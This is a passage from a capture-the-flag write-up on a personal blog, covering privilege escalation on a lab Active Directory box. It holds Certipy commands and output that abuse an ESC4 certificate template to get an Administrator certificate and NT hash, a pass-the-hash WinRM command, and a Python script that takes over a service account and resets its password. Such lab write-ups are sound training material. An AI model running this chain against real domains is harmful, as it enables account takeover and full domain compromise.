after reading the json file <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;33&quot;</span>: &#123;</span><br><span class="line">      <span class="string">&quot;Template Name&quot;</span>: <span class="string">&quot;DunderMifflinAuthentication&quot;</span>, <span class="comment">#interesting</span></span><br><span class="line">      <span class="string">&quot;Display Name&quot;</span>: <span class="string">&quot;Dunder Mifflin Authentication&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Certificate Authorities&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;sequel-DC01-CA&quot;</span> <span class="comment"># we need this </span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Enabled&quot;</span>: <span class="literal">true</span>, <span class="comment">#interesting </span></span><br><span class="line">      <span class="string">&quot;Client Authentication&quot;</span>: <span class="literal">true</span>, <span class="comment">#interesting </span></span><br><span class="line">      <span class="string">&quot;Enrollment Agent&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Any Purpose&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Enrollee Supplies Subject&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Certificate Name Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;SubjectRequireCommonName&quot;</span>,</span><br><span class="line">        <span class="string">&quot;SubjectAltRequireDns&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Enrollment Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;AutoEnrollment&quot;</span>,</span><br><span class="line">        <span class="string">&quot;PublishToDs&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Private Key Flag&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;16842752&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Extended Key Usage&quot;</span>: [</span><br><span class="line">        <span class="string">&quot;Client Authentication&quot;</span>,</span><br><span class="line">        <span class="string">&quot;Server Authentication&quot;</span></span><br><span class="line">      ],</span><br><span class="line">      <span class="string">&quot;Requires Manager Approval&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Requires Key Archival&quot;</span>: <span class="literal">false</span>,</span><br><span class="line">      <span class="string">&quot;Authorized Signatures Required&quot;</span>: 0,</span><br><span class="line">      <span class="string">&quot;Validity Period&quot;</span>: <span class="string">&quot;1000 years&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Renewal Period&quot;</span>: <span class="string">&quot;6 weeks&quot;</span>,</span><br><span class="line">      <span class="string">&quot;Minimum RSA Key Length&quot;</span>: 2048,</span><br><span class="line">      <span class="string">&quot;Permissions&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;Enrollment Permissions&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Enrollment Rights&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="string">&quot;Object Control Permissions&quot;</span>: &#123;</span><br><span class="line">          <span class="string">&quot;Owner&quot;</span>: <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">          <span class="string">&quot;Full Control Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Owner Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Dacl Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ],</span><br><span class="line">          <span class="string">&quot;Write Property Principals&quot;</span>: [</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Domain Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Enterprise Admins&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Administrator&quot;</span>,</span><br><span class="line">            <span class="string">&quot;SEQUEL.HTB\\Cert Publishers&quot;</span> <span class="comment">#interesting VULN</span></span><br><span class="line">          ]</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;[!] Vulnerabilities&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;ESC4&quot;</span>: <span class="string">&quot;&#x27;SEQUEL.HTB\\\\Cert Publishers&#x27; has dangerous permissions&quot;</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
<li>Manipulate the certificate template:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">certipy template -dc-ip 10.10.11.51 -u ca_svc -p <span class="string">&#x27;123456789&#x27;</span> -template DunderMifflinAuthentication -target DC01.sequel.htb  -save-old</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Saved old configuration <span class="keyword">for</span> <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span> to <span class="string">&#x27;DunderMifflinAuthentication.json&#x27;</span></span><br><span class="line">[*] Updating certificate template <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br><span class="line">[*] Successfully updated <span class="string">&#x27;DunderMifflinAuthentication&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Requested a certificate for the Administrator account:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">certipy req -ca sequel-DC01-CA -dc-ip 10.10.11.51 -u ca_svc -p <span class="string">&#x27;123456789&#x27;</span> -template DunderMifflinAuthentication -target DC01.sequel.htb -upn administrator@sequel.htb</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Requesting certificate via RPC</span><br><span class="line">[*] Successfully requested certificate</span><br><span class="line">[*] Request ID is 26</span><br><span class="line">[*] Got certificate with UPN <span class="string">&#x27;administrator@sequel.htb&#x27;</span></span><br><span class="line">[*] Certificate has no object SID</span><br><span class="line">[*] Saved certificate and private key to <span class="string">&#x27;administrator.pfx&#x27;</span></span><br></pre></td></tr></table></figure></li>
<li>Authenticated using the certificate and retrieved the Administrator NT hash:<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">certipy auth -pfx administrator.pfx</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Using principal: administrator@sequel.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;administrator.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator&#x27;</span></span><br><span class="line">[*] Got <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;administrator@sequel.htb&#x27;</span>: aad3b435b51404eeaad3b435b51404ee:7a8d4e04986afa8edXXXXXXX</span><br></pre></td></tr></table></figure>
Finally, we used the Administrator hash to authenticate via WinRM and retrieve the root flag.<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ netexec winrm 10.10.11.51 -u Administrator -H 7a8d4e04986aXXXXXXXXXXXXX -x <span class="string">&#x27;type C:\Users\Administrator\Desktop\root.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:sequel.htb)</span><br><span class="line">/usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module <span class="keyword">in</span> 48.0.0.</span><br><span class="line">  arc4 = algorithms.ARC4(self._key)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] sequel.htb\Administrator:7a8d4e04986aXXXXXXXX (Pwn3d!)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             [+] Executed <span class="built_in">command</span> (shell <span class="built_in">type</span>: cmd)</span><br><span class="line">WINRM       10.10.11.51     5985   DC01             df80XXXXXXXXXXXXXXXXXXXXXXXX</span><br></pre></td></tr></table></figure>
<pre><code>                                         GG!🎉
</code></pre>
</li>
</ol>
<h2 id="KEY-TAKEAWAYS"><a href="#KEY-TAKEAWAYS" class="headerlink" title="KEY TAKEAWAYS"></a>KEY TAKEAWAYS</h2><p><em><strong><span style="color:black; font-size:medium;">Credential Reuse</span></strong></em>: Weak or reused credentials across services can lead to lateral movement and privilege escalation.</p>
<p><em><strong><span style="color:black; font-size:medium;">Misconfigured Permissions</span></strong></em>: Improperly configured permissions (e.g., WriteOwner) can be exploited to gain control over critical accounts.</p>
<p><em><strong><span style="color:black; font-size:medium;">Certificate Template Vulnerabilities</span></strong></em>: Misconfigured certificate templates (e.g., ESC4) can be abused to escalate privileges in Active Directory environments.</p>
<p><em><strong><span style="color:black; font-size:medium;">Persistence and Enumeration</span></strong></em>: Tools like <span style="color:red; font-size:medium;">Bloodhound</span> and <span style="color:red; font-size:medium;">certipy</span> are invaluable for identifying attack paths and misconfigurations in AD environments.</p>
<p>⚠️ <span style="color:red; font-size:medium;">ATTENTION</span>:<br>During my hacking process, I encountered a situation where the credentials for<br>the CA_SVC account would frequently change, rendering them unusable. This<br>forced me to repeat the steps of changing ownership, granting FullControl<br>permissions, and updating the password multiple times. To streamline this<br>tedious process, I created a script to automate these tasks in one go. While<br>the script was functional, the overall experience of dealing with constantly<br>changing credentials was frustrating and inefficient.<br><span style="color:Red; font-size:medium;">BTW</span> : Ensure you have the following tools installed and accessible in your<br> environment:</p>
<ul>
<li><p><strong>owneredit.py</strong></p>
</li>
<li><p><strong>dacledit.py</strong></p>
</li>
<li><p><strong>net</strong></p>
</li>
</ul>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">import subprocess</span><br><span class="line"></span><br><span class="line"><span class="comment"># Define variables</span></span><br><span class="line">domain = <span class="string">&quot;sequel.htb&quot;</span></span><br><span class="line">username = <span class="string">&quot;ryan&quot;</span></span><br><span class="line">password = <span class="string">&quot;WqSZAF6CysDQbGb3&quot;</span></span><br><span class="line">new_owner = <span class="string">&quot;ryan&quot;</span></span><br><span class="line">target_account = <span class="string">&quot;ca_svc&quot;</span></span><br><span class="line">new_password = <span class="string">&quot;123456789&quot;</span></span><br><span class="line">dc_ip = <span class="string">&quot;10.10.11.51&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change ownership of the target account using owneredit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Changing ownership of the target account...&quot;</span>)</span><br><span class="line">owneredit_cmd = [</span><br><span class="line">    <span class="string">&quot;python3&quot;</span>, <span class="string">&quot;owneredit.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-action&quot;</span>, <span class="string">&quot;write&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-new-owner&quot;</span>, new_owner,</span><br><span class="line">    <span class="string">&quot;-target&quot;</span>, target_account,</span><br><span class="line">    f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;:&#123;password&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-dc-ip&quot;</span>, dc_ip</span><br><span class="line">]</span><br><span class="line">subprocess.run(owneredit_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="comment">#  Grant FullControl permissions to the new owner using dacledit</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Granting FullControl permissions to the new owner...&quot;</span>)</span><br><span class="line">dacledit_cmd = [</span><br><span class="line">    <span class="string">&quot;python3&quot;</span>, <span class="string">&quot;dacledit.py&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-action&quot;</span>, <span class="string">&quot;write&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-rights&quot;</span>, <span class="string">&quot;FullControl&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-principal&quot;</span>, new_owner,</span><br><span class="line">    <span class="string">&quot;-target&quot;</span>, target_account,</span><br><span class="line">    f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;:&#123;password&#125;&quot;</span></span><br><span class="line">]</span><br><span class="line">subprocess.run(dacledit_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="comment"># Step 3: Change the password of the target account using net rpc</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[*] Changing the password of the target account...&quot;</span>)</span><br><span class="line">net_rpc_cmd = [</span><br><span class="line">    <span class="string">&quot;net&quot;</span>, <span class="string">&quot;rpc&quot;</span>, <span class="string">&quot;password&quot;</span>, target_account, new_password,</span><br><span class="line">    <span class="string">&quot;-U&quot;</span>, f<span class="string">&quot;&#123;domain&#125;/&#123;username&#125;%&#123;password&#125;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;-S&quot;</span>, domain</span><br><span class="line">]</span><br><span class="line">subprocess.run(net_rpc_cmd, check=True)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;[+] Script executed successfully! Ownership, DACL, and password have been updated.&quot;</span>)</span><br></pre></td></tr></table></figure>


</article>
    
    

</div>
<div class="trm-post-next-prev row">
    <div class="col-lg-12">
        <!-- title -->
        <h5 class="trm-title-with-divider">
            Other Articles
            <span data-number="02"></span>
        </h5>
    </div>
    
    
        <div class="col-lg-6">
    <div class="trm-blog-card trm-scroll-animation">
        <a href="/Certified/" class="trm-cover-frame trm-anima-link">
            
            
                <img alt="cover" class="no-fancybox" src="https://img.goodfon.com/wallpaper/big/5/a8/maska-chernyy-fon-lico.webp">
            
        </a>
        
        <div class="trm-card-descr">
            <div class="trm-label trm-category trm-mb-20">
                <a href=" /categories/ACTIVE-MACHINE/">
                    ACTIVE MACHINE
                </a>
            </div>
            <h5>
                <a href="/Certified/" class="trm-anima-link">
                    Certified
                </a>
            </h5>
            <div class="trm-divider trm-mb-20 trm-mt-20"></div>
            <ul class="trm-card-data trm-label">
                <li>25/01/11</li>
                <li>00:14</li>
                
                    <li>1.5k</li>
                
                
                    <li>9</li>
                
            </ul>
        </div>
    </div>
</div>
    
</div>

    



                    <div class="trm-divider footer-divider"></div>

                    <!-- footer -->
                    <footer class="trm-footer-card trm-scroll-animation">

    

    
        <div class="trm-footer-item">
            <span>© 2024 - 2025</span>
            <span class="footer-separator"data-separator=" · "></span>
            <span class="trm-accent-color">NUTZH</span>
        </div>
    

      

     

    
        <div class="trm-footer-item">
            Keep learning,<br> keep growing,<br> keep moving forward.
        </div>
     
</footer>

<!-- Add Mario here -->
<div class="mario">
    <img src="/images/mario-bros.gif" alt="Mario" />
    <div class="speech-bubble">
       Hi <br>It's-a me, Mario! 🍄 
    </div>
</div>

<!-- Custom CSS -->
<style>
    @media screen and (max-width: 1486px) {
        .mario {
            display: none; /* Hide Mario on small screens */
        }
    }
    .mario {
        position: fixed; /* Fix Mario to the screen */
        left: 10px; /* Position it 20px from the left edge */
        bottom: 20px; /* Position it 20px from the bottom edge */
        cursor: pointer; /* Make it interactive */
        z-index: 1000; /* Ensure it stays on top of other elements */
        animation: float 3s ease-in-out infinite; /* Add a floating animation */
    }

    .mario img {
        width: 160px; /* Adjust the size of the image (smaller) */
        height: auto; /* Maintain aspect ratio */
        transition: transform 0.3s ease; /* Add a smooth animation */
    }

    .mario:hover img {
        transform: scale(1.2); /* Make Mario grow on hover */
    }

    /* Speech bubble */
    .speech-bubble {
    position: absolute;
    bottom: 100%; /* Position the bubble above Mario */
    left: 100%; /* Center the bubble horizontally */
    transform: translateX(-50%); /* Adjust for centering */
    background-color: #fff; /* White background */
    color: #000; /* Black text */
    padding: 9px; /* Increase padding to make the bubble bigger */
    border-radius: 10px;
    box-shadow: 0 2px 5px rgba(0, 0, 0, 0.2); /* Add a shadow */
    font-size: 1.0rem; /* Increase font size */
    text-align: center;
    opacity: 0; /* Hide the bubble by default */
    visibility: hidden; /* Hide the bubble by default */
    transition: opacity 0.3s ease, visibility 0.3s ease; /* Smooth transition */
    white-space: nowrap; /* Prevent text from wrapping */
}

/* Show the speech bubble on hover or click */
.mario:hover .speech-bubble,
.mario:active .speech-bubble {
    opacity: 1; /* Show the bubble */
    visibility: visible; /* Show the bubble */
}
    /* Floating animation */
    @keyframes float {
        0%, 100% {
            transform: translateY(0); /* Start and end at the same position */
        }
        50% {
            transform: translateY(-10px); /* Move Mario up */
        }
    }
</style>
                    <!-- footer end -->

                </div>
            </div>
        </div>
    </div>
</div>
            <!-- body end -->

            

    <div id="post-toc" class="trm-post-toc">
      <div class="trm-post-toc-header">
        Article table of contents
				<span id="post-toc-top">
					TOP
				</span>
      </div>
      <div class="trm-post-toc-content">
        <ol class="trm-toc"><li class="trm-toc-item trm-toc-level-2" title="Table of Contents"><a rel="nofollow" class="trm-toc-link" href="#Table-of-Contents"><span class="trm-toc-number">1.</span> <span class="trm-toc-text">Table of Contents</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Initial Enumeration with Nmap"><a rel="nofollow" class="trm-toc-link" href="#Initial-Enumeration-with-Nmap"><span class="trm-toc-number">2.</span> <span class="trm-toc-text">Initial Enumeration with Nmap</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Key Findings:"><a rel="nofollow" class="trm-toc-link" href="#Key-Findings"><span class="trm-toc-number">3.</span> <span class="trm-toc-text">Key Findings:</span></a></li><li class="trm-toc-item trm-toc-level-2" title="Enumeration services"><a rel="nofollow" class="trm-toc-link" href="#Enumeration-services"><span class="trm-toc-number">4.</span> <span class="trm-toc-text">Enumeration services</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Bloodhound"><a rel="nofollow" class="trm-toc-link" href="#Bloodhound"><span class="trm-toc-number">4.1.</span> <span class="trm-toc-text">Bloodhound</span></a></li><li class="trm-toc-item trm-toc-level-3" title="SMB"><a rel="nofollow" class="trm-toc-link" href="#SMB"><span class="trm-toc-number">4.2.</span> <span class="trm-toc-text">SMB</span></a></li><li class="trm-toc-item trm-toc-level-3" title="Exploiting MSSQL"><a rel="nofollow" class="trm-toc-link" href="#Exploiting-MSSQL"><span class="trm-toc-number">4.3.</span> <span class="trm-toc-text">Exploiting MSSQL</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="Privilege Escalation"><a rel="nofollow" class="trm-toc-link" href="#Privilege-Escalation"><span class="trm-toc-number">5.</span> <span class="trm-toc-text">Privilege Escalation</span></a><ol class="trm-toc-child"><li class="trm-toc-item trm-toc-level-3" title="Exploiting ESC4 Vulnerability"><a rel="nofollow" class="trm-toc-link" href="#Exploiting-ESC4-Vulnerability"><span class="trm-toc-number">5.1.</span> <span class="trm-toc-text">Exploiting ESC4 Vulnerability</span></a></li></ol></li><li class="trm-toc-item trm-toc-level-2" title="KEY TAKEAWAYS"><a rel="nofollow" class="trm-toc-link" href="#KEY-TAKEAWAYS"><span class="trm-toc-number">6.</span> <span class="trm-toc-text">KEY TAKEAWAYS</span></a></li></ol>
      </div>
    </div>

            
<div class="trm-fixed-container">
    
        <div class="trm-fixed-btn post-toc-btn" data-title="Open toc">
            <i class="iconfont fas fa-th-list"></i>
        </div>
    
    
        <div class="trm-fixed-btn" data-title="Read Mode" onclick="asyncFun.switchReadMode()">
            <i class="iconfont fas fa-book-reader"></i>
        </div>
    
    
        <div class="trm-fixed-btn hidden-md" data-title="Toggle between single-column and double-column" onclick="asyncFun.switchSingleColumn()">
            <i class="iconfont fas fa-arrows-alt-h"></i>
        </div>
    
    <div id="trm-back-top" class="trm-fixed-btn" data-title="Back To Top">
        <i class="iconfont fas fa-arrow-up"></i>
    </div>
</div>
        </div>
      </div>
      <!-- scroll container end -->
  </div>
  <!-- app wrapper end -->

  
    <div class="trm-search-popup">
        <div class="trm-search-wrapper">
            <div class="form trm-search-form">
                <div class="trm-search-input-icon">
                    <i class="iconfont fas fa-search"></i>
                </div>
                <input class="trm-search-input" type="text" placeholder="Searching...">
                <div class="trm-search-btn-close">
                    <i class="iconfont fas fa-times"></i>
                </div>
            </div>
            <div class="trm-search-result-container">
                <div class="trm-search-empty">
                    Please enter keywords to search
                </div>
            </div>
            <div class="trm-search-footer">
                <div class="trm-search-stats"></div>
                <ul class="trm-search-commands">
                    <li>
                        <kbd class="command-palette-commands-key">
                            <svg width="15" height="15" aria-label="Escape key" role="img">
                                <g fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round"
                                    stroke-width="1.2">
                                    <path
                                        d="M13.6167 8.936c-.1065.3583-.6883.962-1.4875.962-.7993 0-1.653-.9165-1.653-2.1258v-.5678c0-1.2548.7896-2.1016 1.653-2.1016.8634 0 1.3601.4778 1.4875 1.0724M9 6c-.1352-.4735-.7506-.9219-1.46-.8972-.7092.0246-1.344.57-1.344 1.2166s.4198.8812 1.3445.9805C8.465 7.3992 8.968 7.9337 9 8.5c.032.5663-.454 1.398-1.4595 1.398C6.6593 9.898 6 9 5.963 8.4851m-1.4748.5368c-.2635.5941-.8099.876-1.5443.876s-1.7073-.6248-1.7073-2.204v-.4603c0-1.0416.721-2.131 1.7073-2.131.9864 0 1.6425 1.031 1.5443 2.2492h-2.956">
                                    </path>
                                </g>
                            </svg>
                        </kbd>
                        <span class="command-palette-Label">to close</span>
                    </li>
                </ul>
            </div>
        </div>
    </div>

  <!-- Plugin -->




    
    
<script src="https://unpkg.com/@fancyapps/ui@4.0/dist/fancybox.umd.js"></script>

    

    
        <script src="/js/plugins/typing.js?v=2.2.4"></script>
    

    
        
<script src="https://unpkg.com/hexo-generator-searchdb@1.4.0/dist/search.js"></script>

        <script src="/js/plugins/local_search.js?v=2.2.4"></script>
    

    <!--  -->
    

    <!--  -->
    
        

        
    

		




    <!-- Service Worker -->
    
    <!-- baidu push -->
    


<script id="async-script" src="/js/main.js?v=2.2.4"></script>

<!-- CDN -->


    

    

    



</body>

</html>